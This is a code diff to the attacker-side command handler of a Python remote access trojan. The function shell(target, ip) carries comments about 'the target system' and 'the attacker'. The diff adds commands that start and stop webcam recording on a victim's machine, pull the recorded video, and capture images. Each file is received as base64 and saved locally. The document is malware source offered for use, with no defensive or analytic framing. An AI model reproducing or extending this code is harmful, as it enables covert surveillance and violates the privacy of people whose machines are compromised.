@@ -36,7 +36,6 @@ def shell(target, ip):
 				data = data + target.recv(1024)							# decodes the utf-8 encoded as sent by the Send() function
 				return json.loads(data)
 			except ValueError:														# ValueError signifies that the data to be received is larger than 1024 bytes
-				print("[!] Receiving more data. Please don't interrupt...")
 				continue															# goes back to the loop iteration and adds the remaining data from the execution of try block
 
 
@@ -167,6 +166,39 @@ def shell(target, ip):
 				except Exception as e:
 					print(colored("[!] " + str(e), "red"))
 			
+
+		elif (command == "start video") or (command == "stop video"):
+			try:
+				print(colored(Recv(), "green"))
+			except Exception as e:
+				print(colored("[!] " + str(e), "red"))
+		
+		
+		
+		elif (command == "dump video"):
+			with open("VideoRecording" + str(datetime.now()) + ".mp4", "wb") as videorec:
+				print("[!] Trying to locate and retrieve recorded video. Please wait...")
+				try:
+					video_data = Recv()
+					videorec.write(base64.b64decode(video_data))
+					print(colored("[+] Recorded audio file with date-time-stamp saved at "+ sp.check_output('pwd').decode(), "green"))
+				except Exception as e:
+					print(colored("[!] " + str(e), "red"))
+		
+		
+		elif (command == "capture image"):
+			try:
+				with open("ImageCapture"+str(datetime.now()), "wb") as img:
+					img_data = Recv()
+					if base64.b64decode(img_data)[1] == '-':
+						print(colored(Recv(), "red"))
+					else:
+						img.write(base64.b64decode(img_data))
+						print(colored("[+] Captured image saved at "+ sp.check_output('pwd').decode(), "green"))
+			except Exception as e:
+				print(e)
+				print(colored("[-] Failed to save captured image!", "red"))
+
 
 		# the SS command tries to capture a screenshot of the target system and send it to the attacker
 		#===============================================================================================
